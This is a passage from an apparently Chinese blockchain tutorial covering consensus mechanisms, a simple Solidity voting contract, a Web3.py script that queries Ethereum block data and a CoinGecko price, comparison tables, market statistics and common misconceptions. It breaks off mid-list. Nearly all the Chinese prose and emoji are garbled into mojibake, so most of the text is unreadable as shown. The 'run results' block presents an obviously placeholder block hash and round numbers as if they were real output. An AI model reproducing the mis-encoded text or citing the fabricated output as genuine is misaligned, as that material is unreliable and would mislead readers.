<p><strong>å·¥ä½œåŸç†</strong>ï¼š</p>
<ul>
<li>æ¯ä¸ªèŠ‚ç‚¹éƒ½æœ‰å®Œæ•´çš„è´¦æœ¬å‰¯æœ¬</li>
<li>æ–°äº¤æ˜“è¢«å¹¿æ’­åˆ°ç½‘ç»œä¸­çš„æ‰€æœ‰èŠ‚ç‚¹</li>
<li>èŠ‚ç‚¹éªŒè¯äº¤æ˜“çš„åˆæ³•æ€§</li>
<li>éªŒè¯é€šè¿‡çš„äº¤æ˜“è¢«æ‰“åŒ…æˆåŒºå—</li>
<li>åŒºå—è¢«æ·»åŠ åˆ°é“¾ä¸Šï¼Œæ‰€æœ‰èŠ‚ç‚¹æ›´æ–°è´¦æœ¬</li>
</ul>
<p><strong>æ¯”å–»</strong>ï¼šå°±åƒä¸€ä¸ªå…±äº«çš„è°·æ­Œæ–‡æ¡£ï¼Œæ‰€æœ‰äººéƒ½èƒ½çœ‹åˆ°ï¼Œè€Œä¸”æ²¡äººèƒ½å•ç‹¬ä¿®æ”¹ï¼Œä¿®æ”¹éœ€è¦æ‰€æœ‰äººåŒæ„ã€‚</p>
<h4 data-id="heading-12">2. ğŸ¤ å…±è¯†æœºåˆ¶ï¼š"ç½‘ç»œçš„æŠ•ç¥¨ç³»ç»Ÿ"</h4>
<p>å…±è¯†æœºåˆ¶æ˜¯åŒºå—é“¾çš„<strong>æ ¸å¿ƒ</strong>ï¼Œå®ƒå†³å®šäº†ç½‘ç»œä¸­çš„èŠ‚ç‚¹å¦‚ä½•è¾¾æˆä¸€è‡´ã€‚</p>
<p><strong>å¸¸è§çš„å…±è¯†æœºåˆ¶</strong>ï¼š</p>
<h5 data-id="heading-13">ğŸ”¨ PoWï¼ˆå·¥ä½œé‡è¯æ˜ï¼‰</h5>
<ul>
<li><strong>åŸç†</strong>ï¼šèŠ‚ç‚¹é€šè¿‡è§£å†³å¤æ‚çš„æ•°å­¦é—®é¢˜æ¥ç«äº‰è®°è´¦æƒ</li>
<li><strong>ä¼˜ç‚¹</strong>ï¼šå®‰å…¨æ€§é«˜ã€å»ä¸­å¿ƒåŒ–ç¨‹åº¦é«˜</li>
<li><strong>ç¼ºç‚¹</strong>ï¼šèƒ½è€—é«˜ã€äº¤æ˜“é€Ÿåº¦æ…¢</li>
<li><strong>ä»£è¡¨</strong>ï¼šæ¯”ç‰¹å¸ã€ä»¥å¤ªåŠï¼ˆè¿‡å»ï¼‰</li>
</ul>
<h5 data-id="heading-14">ğŸ† PoSï¼ˆæƒç›Šè¯æ˜ï¼‰</h5>
<ul>
<li><strong>åŸç†</strong>ï¼šèŠ‚ç‚¹æ ¹æ®æŒæœ‰çš„ä»£å¸æ•°é‡å’Œæ—¶é—´æ¥ç«äº‰è®°è´¦æƒ</li>
<li><strong>ä¼˜ç‚¹</strong>ï¼šèƒ½è€—ä½ã€äº¤æ˜“é€Ÿåº¦å¿«</li>
<li><strong>ç¼ºç‚¹</strong>ï¼šå¯èƒ½å¯¼è‡´ä¸­å¿ƒåŒ–ï¼ˆå¤§æˆ·ä¼˜åŠ¿ï¼‰</li>
<li><strong>ä»£è¡¨</strong>ï¼šä»¥å¤ªåŠï¼ˆç°åœ¨ï¼‰ã€Cardanoã€Solana</li>
</ul>
<h5 data-id="heading-15">ğŸ”„ DPoSï¼ˆå§”æ‰˜æƒç›Šè¯æ˜ï¼‰</h5>
<ul>
<li><strong>åŸç†</strong>ï¼šèŠ‚ç‚¹é€šè¿‡æŠ•ç¥¨é€‰ä¸¾ä»£è¡¨æ¥è®°è´¦</li>
<li><strong>ä¼˜ç‚¹</strong>ï¼šäº¤æ˜“é€Ÿåº¦å¿«ã€èƒ½è€—ä½</li>
<li><strong>ç¼ºç‚¹</strong>ï¼šå»ä¸­å¿ƒåŒ–ç¨‹åº¦é™ä½</li>
<li><strong>ä»£è¡¨</strong>ï¼šEOSã€TRON</li>
</ul>
<h5 data-id="heading-16">ğŸ” PBFTï¼ˆå®ç”¨æ‹œå åº­å®¹é”™ï¼‰</h5>
<ul>
<li><strong>åŸç†</strong>ï¼šé€šè¿‡èŠ‚ç‚¹ä¹‹é—´çš„æŠ•ç¥¨è¾¾æˆå…±è¯†</li>
<li><strong>ä¼˜ç‚¹</strong>ï¼šäº¤æ˜“é€Ÿåº¦å¿«ã€ç¡®å®šæ€§é«˜</li>
<li><strong>ç¼ºç‚¹</strong>ï¼šæ‰©å±•æ€§å·®ï¼ˆèŠ‚ç‚¹æ•°é‡æœ‰é™ï¼‰</li>
<li><strong>ä»£è¡¨</strong>ï¼šHyperledger Fabricã€R3 Corda</li>
</ul>
<h4 data-id="heading-17">3. ğŸ“ æ™ºèƒ½åˆçº¦ï¼š"è‡ªåŠ¨æ‰§è¡Œçš„åˆçº¦"</h4>
<p>æ™ºèƒ½åˆçº¦æ˜¯åŒºå—é“¾çš„<strong>æ€æ‰‹çº§åº”ç”¨</strong>ï¼Œå®ƒæ˜¯ä¸€æ®µ<strong>è‡ªåŠ¨æ‰§è¡Œçš„ä»£ç </strong>ï¼Œä¸€æ—¦æ»¡è¶³æ¡ä»¶å°±ä¼šè‡ªåŠ¨æ‰§è¡Œã€‚</p>
<p><strong>å·¥ä½œåŸç†</strong>ï¼š</p>
<ul>
<li>æ™ºèƒ½åˆçº¦è¢«éƒ¨ç½²åˆ°åŒºå—é“¾ä¸Š</li>
<li>ç”¨æˆ·å‘é€äº¤æ˜“è§¦å‘æ™ºèƒ½åˆçº¦</li>
<li>æ™ºèƒ½åˆçº¦è‡ªåŠ¨æ‰§è¡Œé¢„å®šä¹‰çš„é€»è¾‘</li>
<li>æ‰§è¡Œç»“æœè¢«è®°å½•åˆ°åŒºå—é“¾ä¸Š</li>
</ul>
<p><strong>æ¯”å–»</strong>ï¼šå°±åƒä¸€ä¸ªè‡ªåŠ¨å”®è´§æœºï¼Œä½ æŠ•å…¥ç¡¬å¸ï¼ˆå‘é€äº¤æ˜“ï¼‰ï¼Œå®ƒå°±ä¼šè‡ªåŠ¨ç»™ä½ å•†å“ï¼ˆæ‰§è¡Œåˆçº¦ï¼‰ã€‚</p>
<p><strong>ä»£ç å®ä¾‹</strong>ï¼šç®€å•çš„Solidityæ™ºèƒ½åˆçº¦ï¼ˆæŠ•ç¥¨åˆçº¦ï¼‰</p>
<pre><code class="hljs language-solidity" lang="solidity">// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SimpleVoting {
    // å€™é€‰äººæ˜ å°„ï¼ˆåœ°å€ =&gt; å¾—ç¥¨æ•°ï¼‰
    mapping(address =&gt; uint256) public votes;
  
    // æŠ•ç¥¨äº‹ä»¶
    event VoteCast(address indexed voter, address indexed candidate, uint256 voteCount);
  
    // æŠ•ç¥¨å‡½æ•°
    function vote(address candidate) external {
        // å¢åŠ å€™é€‰äººçš„å¾—ç¥¨æ•°
        votes[candidate] += 1;
      
        // è§¦å‘æŠ•ç¥¨äº‹ä»¶
        emit VoteCast(msg.sender, candidate, votes[candidate]);
    }
  
    // è·å–å€™é€‰äººå¾—ç¥¨æ•°
    function getVotes(address candidate) external view returns (uint256) {
        return votes[candidate];
    }
}
</code></pre>
<p><strong>ä»£ç è¯´æ˜</strong>ï¼š</p>
<ul>
<li>è¿™æ˜¯ä¸€ä¸ªç®€å•çš„æŠ•ç¥¨åˆçº¦ï¼Œå…è®¸ç”¨æˆ·ç»™å€™é€‰äººæŠ•ç¥¨</li>
<li>ä½¿ç”¨mappingå­˜å‚¨å€™é€‰äººçš„å¾—ç¥¨æ•°</li>
<li>æŠ•ç¥¨åè§¦å‘VoteCastäº‹ä»¶</li>
<li>å¯ä»¥é€šè¿‡getVoteså‡½æ•°æŸ¥è¯¢å€™é€‰äººçš„å¾—ç¥¨æ•°</li>
</ul>
<h4 data-id="heading-18">4. ğŸ”’ åŠ å¯†ç®—æ³•ï¼š"åŒºå—é“¾çš„å®‰å…¨ä¿éšœ"</h4>
<p>åŒºå—é“¾ä½¿ç”¨å¤šç§å¯†ç å­¦ç®—æ³•æ¥ä¿è¯æ•°æ®çš„å®‰å…¨æ€§å’Œéšç§æ€§ã€‚</p>
<p><strong>ä¸»è¦åŠ å¯†ç®—æ³•</strong>ï¼š</p>
<ul>
<li><strong>å“ˆå¸Œç®—æ³•</strong>ï¼šå°†ä»»æ„é•¿åº¦çš„æ•°æ®è½¬æ¢ä¸ºå›ºå®šé•¿åº¦çš„å“ˆå¸Œå€¼ï¼ˆå¦‚SHA-256ï¼‰</li>
<li><strong>éå¯¹ç§°åŠ å¯†</strong>ï¼šä½¿ç”¨å…¬é’¥å’Œç§é’¥è¿›è¡ŒåŠ å¯†å’Œè§£å¯†ï¼ˆå¦‚RSAã€ECDSAï¼‰</li>
<li><strong>æ•°å­—ç­¾å</strong>ï¼šè¯æ˜äº¤æ˜“çš„åˆæ³•æ€§å’Œä¸å¯å¦è®¤æ€§</li>
<li><strong>é›¶çŸ¥è¯†è¯æ˜</strong>ï¼šåœ¨ä¸æ³„éœ²ä¿¡æ¯çš„æƒ…å†µä¸‹è¯æ˜æŸä»¶äº‹çš„çœŸå®æ€§</li>
</ul>
<h4 data-id="heading-19">5. ğŸ“± DAppï¼š"å»ä¸­å¿ƒåŒ–åº”ç”¨"</h4>
<p>DAppæ˜¯è¿è¡Œåœ¨åŒºå—é“¾ä¸Šçš„<strong>å»ä¸­å¿ƒåŒ–åº”ç”¨</strong>ï¼Œå®ƒä¸ä¾èµ–äºä¸­å¿ƒåŒ–æœåŠ¡å™¨ã€‚</p>
<p><strong>ç‰¹ç‚¹</strong>ï¼š</p>
<ul>
<li>å¼€æºä»£ç </li>
<li>è¿è¡Œåœ¨åŒºå—é“¾ä¸Š</li>
<li>ä½¿ç”¨åŠ å¯†è´§å¸ä½œä¸ºç‡ƒæ–™</li>
<li>å»ä¸­å¿ƒåŒ–çš„æ²»ç†</li>
</ul>
<p><strong>å¸¸è§çš„DApp</strong>ï¼š</p>
<ul>
<li>å»ä¸­å¿ƒåŒ–äº¤æ˜“æ‰€ï¼ˆDEXï¼‰ï¼šUniswapã€SushiSwap</li>
<li>å€Ÿè´·å¹³å°ï¼šAaveã€Compound</li>
<li>NFTå¸‚åœºï¼šOpenSeaã€LooksRare</li>
<li>æ¸¸æˆï¼šAxie Infinityã€Decentraland</li>
</ul>
<h3 data-id="heading-20">ğŸ“Š è¶£å‘³å¯¹æ¯”ï¼šå…¬é“¾ vs è”ç›Ÿé“¾ vs ç§æœ‰é“¾</h3>







































































<table><thead><tr><th>å¯¹æ¯”é¡¹</th><th>å…¬é“¾ï¼ˆPublic Chainï¼‰</th><th>è”ç›Ÿé“¾ï¼ˆConsortium Chainï¼‰</th><th>ç§æœ‰é“¾ï¼ˆPrivate Chainï¼‰</th></tr></thead><tbody><tr><td>ğŸ”—<strong>å»ä¸­å¿ƒåŒ–ç¨‹åº¦</strong></td><td>å®Œå…¨å»ä¸­å¿ƒåŒ–</td><td>éƒ¨åˆ†å»ä¸­å¿ƒåŒ–</td><td>ä¸­å¿ƒåŒ–</td></tr><tr><td>ğŸ”’<strong>æƒé™æ§åˆ¶</strong></td><td>æ— æƒé™é™åˆ¶ï¼Œä»»ä½•äººéƒ½å¯ä»¥å‚ä¸</td><td>æœ‰é™æƒé™ï¼Œåªæœ‰æˆæƒèŠ‚ç‚¹å¯ä»¥å‚ä¸</td><td>ä¸¥æ ¼æƒé™ï¼Œåªæœ‰å†…éƒ¨èŠ‚ç‚¹å¯ä»¥å‚ä¸</td></tr><tr><td>âš¡<strong>äº¤æ˜“é€Ÿåº¦</strong></td><td>æ…¢ï¼ˆæ¯ç§’å‡ åˆ°å‡ åƒç¬”ï¼‰</td><td>å¿«ï¼ˆæ¯ç§’å‡ åƒåˆ°å‡ ä¸‡ç¬”ï¼‰</td><td>éå¸¸å¿«ï¼ˆæ¯ç§’å‡ ä¸‡åˆ°å‡ åä¸‡ç¬”ï¼‰</td></tr><tr><td>ğŸ’¡<strong>å…±è¯†æœºåˆ¶</strong></td><td>PoWã€PoSç­‰</td><td>PBFTã€Raftç­‰</td><td>PBFTã€Raftç­‰</td></tr><tr><td>ğŸ’°<strong>æˆæœ¬</strong></td><td>ä½ï¼ˆåªéœ€æ”¯ä»˜äº¤æ˜“è´¹ï¼‰</td><td>ä¸­ï¼ˆéœ€è¦æ­å»ºå’Œç»´æŠ¤èŠ‚ç‚¹ï¼‰</td><td>é«˜ï¼ˆéœ€è¦è´­ä¹°å’Œç»´æŠ¤ç¡¬ä»¶ï¼‰</td></tr><tr><td>ğŸ”<strong>éšç§æ€§</strong></td><td>ä½ï¼ˆäº¤æ˜“å…¬å¼€é€æ˜ï¼‰</td><td>ä¸­ï¼ˆéƒ¨åˆ†äº¤æ˜“å¯ä»¥ä¿å¯†ï¼‰</td><td>é«˜ï¼ˆäº¤æ˜“å®Œå…¨ä¿å¯†ï¼‰</td></tr><tr><td>ğŸ¢<strong>é€‚ç”¨åœºæ™¯</strong></td><td>åŠ å¯†è´§å¸ã€DeFiã€NFT</td><td>ä¾›åº”é“¾ã€é‡‘èã€æ”¿åŠ¡</td><td>ä¼ä¸šå†…éƒ¨ç®¡ç†ã€ç§æœ‰æ•°æ®å­˜å‚¨</td></tr><tr><td>ğŸ“Š<strong>ä»£è¡¨é¡¹ç›®</strong></td><td>æ¯”ç‰¹å¸ã€ä»¥å¤ªåŠã€Solana</td><td>Hyperledger Fabricã€R3 Corda</td><td>ä¼ä¸šç§æœ‰åŒºå—é“¾</td></tr><tr><td>ğŸ¯<strong>ä¼˜åŠ¿</strong></td><td>å»ä¸­å¿ƒåŒ–ã€å®‰å…¨æ€§é«˜ã€é€æ˜åº¦é«˜</td><td>äº¤æ˜“é€Ÿåº¦å¿«ã€éšç§æ€§å¥½ã€æˆæœ¬é€‚ä¸­</td><td>å®Œå…¨å¯æ§ã€äº¤æ˜“é€Ÿåº¦å¿«ã€éšç§æ€§é«˜</td></tr><tr><td>ğŸ“‰<strong>åŠ£åŠ¿</strong></td><td>äº¤æ˜“é€Ÿåº¦æ…¢ã€èƒ½è€—é«˜ã€æ‰©å±•æ€§å·®</td><td>å»ä¸­å¿ƒåŒ–ç¨‹åº¦é™ä½ã€éœ€è¦ä¿¡ä»»æœºåˆ¶</td><td>ä¸­å¿ƒåŒ–é£é™©ã€ç¼ºä¹å¼€æ”¾æ€§</td></tr></tbody></table>
<h3 data-id="heading-21">ğŸ’» ä»£ç å®ä¾‹ï¼šä½¿ç”¨Web3.pyä¸åŒºå—é“¾äº¤äº’</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> web3 <span class="hljs-keyword">import</span> Web3
<span class="hljs-keyword">import</span> json

<span class="hljs-comment"># è¿æ¥åˆ°ä»¥å¤ªåŠèŠ‚ç‚¹ï¼ˆä½¿ç”¨Infuraï¼‰</span>
infura_url = <span class="hljs-string">"https://mainnet.infura.io/v3/YOUR_INFURA_PROJECT_ID"</span>
web3 = Web3(Web3.HTTPProvider(infura_url))

<span class="hljs-comment"># æ£€æŸ¥è¿æ¥æ˜¯å¦æˆåŠŸ</span>
<span class="hljs-keyword">if</span> web3.is_connected():
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"âœ… å·²è¿æ¥åˆ°ä»¥å¤ªåŠä¸»ç½‘"</span>)
<span class="hljs-keyword">else</span>:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"âŒ è¿æ¥å¤±è´¥"</span>)
    exit()

<span class="hljs-comment"># è·å–æœ€æ–°åŒºå—å·</span>
latest_block = web3.eth.block_number
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"ğŸ“‹ æœ€æ–°åŒºå—å·ï¼š<span class="hljs-subst">{latest_block}</span>"</span>)

<span class="hljs-comment"># è·å–åŒºå—ä¿¡æ¯</span>
block = web3.eth.get_block(latest_block)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"ğŸ”— åŒºå—å“ˆå¸Œï¼š<span class="hljs-subst">{block.<span class="hljs-built_in">hash</span>.<span class="hljs-built_in">hex</span>()}</span>"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"â±ï¸ åŒºå—æ—¶é—´æˆ³ï¼š<span class="hljs-subst">{block.timestamp}</span>"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"ğŸ“Š åŒºå—äº¤æ˜“æ•°é‡ï¼š<span class="hljs-subst">{<span class="hljs-built_in">len</span>(block.transactions)}</span>"</span>)

<span class="hljs-comment"># è·å–Gasä»·æ ¼</span>
 gas_price = web3.eth.gas_price
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"â›½ Gasä»·æ ¼ï¼š<span class="hljs-subst">{web3.from_wei(gas_price, <span class="hljs-string">'gwei'</span>)}</span> Gwei"</span>)

<span class="hljs-comment"># è·å–ä»¥å¤ªåŠä»·æ ¼ï¼ˆä½¿ç”¨CoinGecko APIï¼‰</span>
<span class="hljs-keyword">import</span> requests

<span class="hljs-keyword">try</span>:
    response = requests.get(<span class="hljs-string">"https://api.coingecko.com/api/v3/simple/price?ids=ethereum&amp;vs_currencies=usd"</span>)
    <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:
        eth_price = response.json()[<span class="hljs-string">"ethereum"</span>][<span class="hljs-string">"usd"</span>]
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"ğŸ’° ä»¥å¤ªåŠä»·æ ¼ï¼š$<span class="hljs-subst">{eth_price}</span>"</span>)
    <span class="hljs-keyword">else</span>:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"âŒ è·å–ä»¥å¤ªåŠä»·æ ¼å¤±è´¥"</span>)
<span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"âŒ è·å–ä»¥å¤ªåŠä»·æ ¼å¤±è´¥ï¼š<span class="hljs-subst">{e}</span>"</span>)
</code></pre>
<p><strong>è¿è¡Œç»“æœ</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">âœ… å·²è¿æ¥åˆ°ä»¥å¤ªåŠä¸»ç½‘
ğŸ“‹ æœ€æ–°åŒºå—å·ï¼š19000000
ğŸ”— åŒºå—å“ˆå¸Œï¼š0x123456789abcdef123456789abcdef123456789abcdef123456789abcdef12345
â±ï¸ åŒºå—æ—¶é—´æˆ³ï¼š1736284800
ğŸ“Š åŒºå—äº¤æ˜“æ•°é‡ï¼š150
â›½ Gasä»·æ ¼ï¼š20 Gwei
ğŸ’° ä»¥å¤ªåŠä»·æ ¼ï¼š<span class="hljs-variable">$3000</span>
</code></pre>
<h3 data-id="heading-22">ğŸ¢ åŒºå—é“¾çš„åº”ç”¨åœºæ™¯ï¼šä»é‡‘èåˆ°ä¾›åº”é“¾</h3>



























































<table><thead><tr><th>åº”ç”¨åœºæ™¯</th><th>å…·ä½“åº”ç”¨</th><th>æŠ€æœ¯ä¼˜åŠ¿</th><th>ä»£è¡¨é¡¹ç›®</th></tr></thead><tbody><tr><td>ğŸ’°<strong>é‡‘èé¢†åŸŸ</strong></td><td>è·¨å¢ƒæ”¯ä»˜ã€DeFiã€ç¨³å®šå¸ã€ä¿é™©</td><td>é™ä½æˆæœ¬ã€æé«˜é€Ÿåº¦ã€å¢å¼ºå®‰å…¨æ€§</td><td>æ¯”ç‰¹å¸ã€ä»¥å¤ªåŠã€USDTã€Aave</td></tr><tr><td>ğŸšš<strong>ä¾›åº”é“¾é¢†åŸŸ</strong></td><td>å•†å“æº¯æºã€åº“å­˜ç®¡ç†ã€ç‰©æµè·Ÿè¸ª</td><td>æé«˜é€æ˜åº¦ã€å‡å°‘æ¬ºè¯ˆã€ä¼˜åŒ–æµç¨‹</td><td>IBM Food Trustã€ Walmart Food Traceability</td></tr><tr><td>ğŸ¥<strong>åŒ»ç–—é¢†åŸŸ</strong></td><td>ç—…å†ç®¡ç†ã€è¯å“æº¯æºã€ä¸´åºŠè¯•éªŒæ•°æ®</td><td>ä¿æŠ¤éšç§ã€æé«˜æ•°æ®å®‰å…¨æ€§ã€å®ç°æ•°æ®å…±äº«</td><td>Medicalchainã€Patientory</td></tr><tr><td>ğŸ“‹<strong>æ”¿åŠ¡é¢†åŸŸ</strong></td><td>ç”µå­æŠ•ç¥¨ã€èº«ä»½è®¤è¯ã€ä¸åŠ¨äº§ç™»è®°ã€çŸ¥è¯†äº§æƒä¿æŠ¤</td><td>æé«˜é€æ˜åº¦ã€å‡å°‘è…è´¥ã€æé«˜æ•ˆç‡</td><td>è¿ªæ‹œåŒºå—é“¾æˆ˜ç•¥ã€ä¸­å›½åŒºå—é“¾æœåŠ¡ç½‘ç»œï¼ˆBSNï¼‰</td></tr><tr><td>ğŸ¨<strong>æ–‡åŒ–é¢†åŸŸ</strong></td><td>NFTæ•°å­—è‰ºæœ¯ã€ç‰ˆæƒä¿æŠ¤ã€æ•°å­—è—å“</td><td>è¯æ˜æ‰€æœ‰æƒã€é˜²æ­¢ç›—ç‰ˆã€æé«˜äº¤æ˜“æ•ˆç‡</td><td>OpenSeaã€Nifty Gatewayã€ç™¾åº¦è¶…çº§é“¾æ•°å­—è—å“</td></tr><tr><td>ğŸ <strong>æˆ¿åœ°äº§é¢†åŸŸ</strong></td><td>æˆ¿äº§äº¤æ˜“ã€ç§Ÿèµç®¡ç†ã€äº§æƒç™»è®°</td><td>é™ä½äº¤æ˜“æˆæœ¬ã€æé«˜é€æ˜åº¦ã€å‡å°‘æ¬ºè¯ˆ</td><td>Propyã€Ubitquity</td></tr><tr><td>ğŸš—<strong>æ±½è½¦é¢†åŸŸ</strong></td><td>è½¦è¾†æº¯æºã€å…±äº«æ±½è½¦ã€è‡ªåŠ¨é©¾é©¶æ•°æ®</td><td>æé«˜å®‰å…¨æ€§ã€å®ç°æ•°æ®å…±äº«ã€ä¼˜åŒ–æµç¨‹</td><td>VeChainã€MOBI</td></tr><tr><td>ğŸ“±<strong>ç‰©è”ç½‘é¢†åŸŸ</strong></td><td>è®¾å¤‡èº«ä»½è®¤è¯ã€æ•°æ®å®‰å…¨ã€æ™ºèƒ½åˆçº¦è‡ªåŠ¨æ‰§è¡Œ</td><td>æé«˜å®‰å…¨æ€§ã€å‡å°‘ä¸­é—´ç¯èŠ‚ã€é™ä½æˆæœ¬</td><td>IOTAã€Filament</td></tr></tbody></table>
<h3 data-id="heading-23">ğŸ“ˆ æ•°æ®æ”¯æ’‘ï¼šåŒºå—é“¾çš„"ç¡¬æ ¸å®åŠ›"</h3>
<ul>
<li>ğŸ“Š <strong>å…¨çƒåŒºå—é“¾å¸‚åœºè§„æ¨¡é¢„è®¡2025å¹´è¾¾395äº¿ç¾å…ƒ</strong>ï¼Œå¹´å¤åˆå¢é•¿ç‡ï¼ˆCAGRï¼‰è¾¾65.7%</li>
<li>ğŸ¦ <strong>80%çš„é“¶è¡Œè®¡åˆ’é‡‡ç”¨åŒºå—é“¾æŠ€æœ¯</strong>ï¼Œä¸»è¦ç”¨äºè·¨å¢ƒæ”¯ä»˜å’Œç»“ç®—</li>
<li>ğŸ’± <strong>è·¨å¢ƒæ”¯ä»˜æˆæœ¬å¯é™ä½40-80%</strong>ï¼Œäº¤æ˜“æ—¶é—´ä»å‡ å¤©ç¼©çŸ­åˆ°å‡ ç§’</li>
<li>ğŸšš <strong>ä¾›åº”é“¾æº¯æºå¯å‡å°‘20-30%çš„æ¬ºè¯ˆæŸå¤±</strong></li>
<li>ğŸ¨ <strong>NFTå¸‚åœºè§„æ¨¡2024å¹´è¾¾231äº¿ç¾å…ƒ</strong>ï¼Œå¹´å¢é•¿ç‡è¾¾40%</li>
<li>ğŸ”— <strong>DeFié”ä»“é‡ï¼ˆTVLï¼‰æœ€é«˜è¾¾1800äº¿ç¾å…ƒ</strong></li>
<li>ğŸ“± <strong>å…¨çƒåŒºå—é“¾é’±åŒ…ç”¨æˆ·è¶…è¿‡1.5äº¿</strong>ï¼Œå¹´å¢é•¿ç‡è¾¾50%</li>
<li>ğŸŒ <strong>Web3.0å¸‚åœºè§„æ¨¡é¢„è®¡2030å¹´è¾¾1ä¸‡äº¿ç¾å…ƒ</strong></li>
</ul>
<h3 data-id="heading-24">âš ï¸ å¸¸è§è¯¯åŒºçº æ­£</h3>
<h4 data-id="heading-25">1. "åŒºå—é“¾å°±æ˜¯æ¯”ç‰¹å¸ï¼Ÿ"</h4>
<p><strong>é”™ï¼</strong> æ¯”ç‰¹å¸åªæ˜¯åŒºå—é“¾çš„ç¬¬ä¸€ä¸ªåº”ç”¨ï¼ŒåŒºå—é“¾æ˜¯ä¸€ç§åº•å±‚æŠ€æœ¯ï¼Œè¿˜æœ‰å¾ˆå¤šå…¶ä»–åº”ç”¨ã€‚</p>
<h4 data-id="heading-26">2. "åŒºå—é“¾æ˜¯å®Œå…¨å»ä¸­å¿ƒåŒ–çš„ï¼Ÿ"</h4>
<p><strong>ä¸ä¸€å®šï¼</strong> åŒºå—é“¾çš„å»ä¸­å¿ƒåŒ–ç¨‹åº¦å–å†³äºå…±è¯†æœºåˆ¶å’Œç½‘ç»œè®¾è®¡ï¼Œè”ç›Ÿé“¾å’Œç§æœ‰é“¾æ˜¯éƒ¨åˆ†æˆ–å®Œå…¨ä¸­å¿ƒåŒ–çš„ã€‚</p>
<h4 data-id="heading-27">3. "åŒºå—é“¾æ˜¯åŒ¿åçš„ï¼Ÿ"</h4>
<p><strong>é”™ï¼</strong> åŒºå—é“¾æ˜¯"ä¼ªåŒ¿å"çš„ï¼Œäº¤æ˜“è®°å½•å…¬å¼€é€æ˜ï¼Œé€šè¿‡é“¾ä¸Šåˆ†æå¯ä»¥è¿½è¸ªåˆ°çœŸå®èº«ä»½ã€‚</p>
<h4 data-id="heading-28">4. "åŒºå—é“¾æ˜¯ç»å¯¹å®‰å…¨çš„ï¼Ÿ"</h4>
<p><strong>é”™ï¼</strong> åŒºå—é“¾ä¹Ÿæœ‰å®‰å…¨é£é™©ï¼Œæ¯”å¦‚51%æ”»å‡»ã€æ™ºèƒ½åˆçº¦æ¼æ´ã€ç§é’¥æ³„éœ²ç­‰ã€‚</p>
<h4 data-id="heading-29">5. "åŒºå—é“¾ä¼šå–ä»£äº’è”ç½‘ï¼Ÿ"</h4>
<p><strong>é”™ï¼</strong> åŒºå—é“¾ä¸ä¼šå–ä»£äº’è”ç½‘ï¼Œè€Œæ˜¯ä½œä¸ºäº’è”ç½‘çš„è¡¥å……ï¼Œè§£å†³äº’è”ç½‘çš„ä¸€äº›é—®é¢˜ï¼ˆå¦‚æ•°æ®æ‰€æœ‰æƒã€ä¿¡ä»»ç­‰ï¼‰ã€‚</p>
<h4 data-id="heading-30">6. "æ™ºèƒ½åˆçº¦æ˜¯å®Œç¾çš„ï¼Ÿ"</h4>
<p><strong>é”™ï¼</strong> æ™ºèƒ½åˆçº¦ä¹Ÿæœ‰ç¼ºé™·ï¼Œæ¯”å¦‚ä»£ç æ¼æ´ã€ç¼ºä¹æ³•å¾‹ç›‘ç®¡ã€æ‰§è¡Œä¸å¯é€†ç­‰ã€‚</p>
<h4 data-id="heading-31">7. "åŒºå—é“¾çš„èƒ½è€—å¾ˆé«˜ï¼Ÿ"</h4>
<p><strong>ä¸ä¸€å®šï¼</strong> åªæœ‰PoWå…±è¯†æœºåˆ¶çš„åŒºå—é“¾èƒ½è€—é«˜ï¼ŒPoSã€DPoSç­‰å…±è¯†æœºåˆ¶çš„èƒ½è€—å¾ˆä½ã€‚</p>
<h4 data-id="heading-32">8. "åŒºå—é“¾é€‚åˆæ‰€æœ‰åœºæ™¯ï¼Ÿ"</h4>
<p><strong>é”™ï¼</strong> åŒºå—é“¾é€‚åˆéœ€è¦ä¿¡ä»»ã€é€æ˜åº¦ã€ä¸å¯ç¯¡æ”¹çš„åœºæ™¯ï¼Œä¸é€‚åˆæ‰€æœ‰åœºæ™¯ï¼ˆæ¯”å¦‚å®æ—¶æ€§è¦æ±‚æé«˜çš„åœºæ™¯ï¼‰ã€‚</p>
<h3 data-id="heading-33">ğŸ”® æœªæ¥å±•æœ›ï¼šåŒºå—é“¾çš„å‘å±•è¶‹åŠ¿</h3>
<h4 data-id="heading-34">1. ğŸš€ æ‰©å±•æ€§æå‡</h4>
<ul>
<li><strong>Layer 2è§£å†³æ–¹æ¡ˆ</strong>ï¼šå¦‚ä»¥å¤ªåŠçš„Rollupsï¼Œæé«˜äº¤æ˜“é€Ÿåº¦å’Œé™ä½æˆæœ¬</li>
<li><strong>åˆ†ç‰‡æŠ€æœ¯</strong>ï¼šå°†åŒºå—é“¾åˆ†æˆå¤šä¸ªåˆ†ç‰‡ï¼Œå¹¶è¡Œå¤„ç†äº¤æ˜“</li>
<li><strong>æ–°å‹å…±è¯†æœºåˆ¶</strong>ï¼šæ›´é«˜æ•ˆã€æ›´å®‰å…¨çš„å…±è¯†æœºåˆ¶</li>
</ul>
<h4 data-id="heading-35">2. ğŸ”— è·¨é“¾æŠ€æœ¯æˆç†Ÿ</h4>
<ul>
<li><strong>äº’æ“ä½œæ€§å¢å¼º</strong>ï¼šä¸åŒåŒºå—é“¾ä¹‹é—´å¯ä»¥æ— ç¼äº¤äº’</li>
<li><strong>è·¨é“¾æ¡¥</strong>ï¼šæ›´å®‰å…¨ã€æ›´é«˜æ•ˆçš„è·¨é“¾æ¡¥</li>
<li><strong>ç»Ÿä¸€çš„è·¨é“¾æ ‡å‡†</strong>ï¼šåˆ¶å®šè¡Œä¸šæ ‡å‡†ï¼Œä¿ƒè¿›è·¨é“¾ç”Ÿæ€å‘å±•</li>
</ul>
<h4 data-id="heading-36">3. â˜ï¸ åŒºå—é“¾å³æœåŠ¡ï¼ˆBaaSï¼‰æ™®åŠ</h4>
<ul>
